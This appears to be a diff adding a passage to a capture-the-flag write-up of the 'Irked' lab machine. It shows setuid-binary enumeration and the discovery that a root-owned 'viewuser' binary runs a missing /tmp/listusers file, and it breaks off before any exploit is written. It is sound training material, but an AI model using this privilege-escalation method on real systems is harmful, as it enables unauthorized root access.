@@ -163,3 +163,66 @@ ircd@irked:~/Unreal3.2$
 ```
 
 
+Time to explore this machine. id command shows ircd.
+
+Looking for setuid files shows 
+
+```
+ircd@irked:~/Unreal3.2$ find / -perm -4000
+find / -perm -4000
+find: `/lost+found': Permission denied
+find: `/sys/kernel/debug': Permission denied
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
+/usr/sbin/exim4
+/usr/sbin/pppd
+/usr/bin/chsh
+/usr/bin/procmail
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/at
+/usr/bin/pkexec
+/usr/bin/X
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/viewuser
+find: `/etc/ssl/private': Permission denied
+find: `/etc/polkit-1/localauthority': Permission denied
+find: `/etc/chatscripts': Permission denied
+find: `/etc/cups/ssl': Permission denied
+find: `/etc/ppp/peers': Permission denied
+find: `/var/cache/ldconfig': Permission denied
+find: `/var/cache/cups': Permission denied
+find: `/home/djmardov/.gconf': Permission denied
+find: `/home/djmardov/.local': Permission denied
+find: `/home/djmardov/.config': Permission denied
+find: `/home/djmardov/.mozilla': Permission denied
+```
+
+We have a user djmardov. Looking in /usr/bin for the other setuid files, "ls -lrt" shows that viewuser was modified last.
+
+```
+lrwxrwxrwx 1 root   root          35 May 11  2018 gnome-text-editor -> /etc/alternatives/gnome-text-editor
+lrwxrwxrwx 1 root   root          20 May 11  2018 cc -> /etc/alternatives/cc
+lrwxrwxrwx 1 root   root          21 May 11  2018 c89 -> /etc/alternatives/c89
+lrwxrwxrwx 1 root   root          21 May 11  2018 c99 -> /etc/alternatives/c99
+lrwxrwxrwx 1 root   root          21 May 11  2018 c++ -> /etc/alternatives/c++
+lrwxrwxrwx 1 root   root          26 May 11  2018 fakeroot -> /etc/alternatives/fakeroot
+-rwsr-xr-x 1 root   root        7328 May 16  2018 viewuser
+```
+
+When I run viewuser, I see it expects a file.
+```
+ircd@irked:/usr/bin$ viewuser
+viewuser
+(unknown) :0           2021-02-20 19:54 (:0)
+sh: 1: /tmp/listusers: not found
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+ircd@irked:/usr/bin$ 
+```
+
+so we create a file 
